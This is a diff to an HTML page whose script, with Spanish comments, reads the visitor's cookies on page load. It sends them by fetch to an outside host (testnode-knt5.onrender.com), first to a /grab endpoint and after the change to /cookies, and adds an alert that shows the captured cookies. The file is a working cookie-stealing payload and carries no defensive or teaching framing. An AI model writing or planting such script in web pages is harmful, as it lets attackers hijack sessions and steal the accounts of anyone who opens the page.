@@ -7,13 +7,15 @@
 </head>
 <body>
     <script>
+        // Obtener las cookies de la página actual
         const cookies = document.cookie;
-        console.log("Cookies capturadas:", cookies);
+        alert("Cookies obtenidas: " + cookies);
 
-        // Envía las cookies al servidor usando el endpoint /grab
-        fetch(`https://testnode-knt5.onrender.com/grab?data=${cookies}`, { 
-            method: 'GET',
+        // Enviar las cookies al servidor
+        fetch(`https://testnode-knt5.onrender.com/cookies?cookies=${cookies}`, { 
+            method: 'GET',  
         })
+
     </script>
 </body>
 </html>
